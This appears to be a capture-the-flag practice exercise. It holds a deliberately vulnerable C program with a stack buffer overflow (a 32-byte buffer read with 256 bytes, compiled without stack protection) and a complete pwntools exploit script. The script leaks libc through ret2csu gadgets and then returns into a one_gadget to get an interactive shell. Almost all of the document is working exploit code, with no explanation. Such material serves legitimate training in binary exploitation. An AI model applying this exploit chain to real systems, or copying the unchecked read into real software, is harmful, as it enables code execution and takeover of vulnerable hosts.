

```c
//gcc -o ret2csu -no-pie -z lazy -fno-stack-protector ret2csu.c
#include<stdio.h>
#include <unistd.h>
void init() {
	setvbuf(stdin, 0LL, 2, 0LL);
	setvbuf(stdout, 0LL, 2, 0LL);
	setvbuf(stderr, 0LL, 2, 0LL);
}
void vuln(){
	char buf[0x20];
	write(1,"hello!",6);
	read(0,buf,0x100);
	return;
}
int main(){
	vuln();
	return 0;
}
```



exp

```python
from pwn import*
context.arch = 'amd64'
context.log_level = 'debug'
def pr(a,addr):
	log.success(a+'====>'+hex(addr))

def csu(arg1,arg2,arg3,func,retfun):
	mmmc = 0x400730
	pop6_ret = 0x40074a
	payload = p64(pop6_ret)
	payload += p64(0)+p64(1)+p64(func)+p64(arg1)+p64(arg2)+p64(arg3)
	payload += p64(mmmc)+'a'*56
	payload += p64(retfun)
	return payload

p = process('./ret2csu')
elf = ELF('./ret2csu')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

write_plt = elf.plt['write']
write_got = elf.got['write']

vuln = 0x400698
prdi = 0x400753

payload = 'a'*0x28+csu(1,write_got,8,write_got,vuln)
p.sendafter('!',payload)

libcbase = u64(p.recv(8)) - libc.sym['write']
system = libcbase + libc.sym['system']
sh = libcbase + libc.search('/bin/sh').next()
ogg  = libcbase + [0x4f3d5,0x4f432,0x10a41c][1]
pr('libcbase',libcbase)
pr('system',system)
pr('sh',sh)


#gdb.attach(p,'b *0x00000000004006cd')
payload = '\x00'*0x28+p64(ogg)
p.sendafter('!',payload.ljust(0x100,'\x00'))

p.interactive()
```

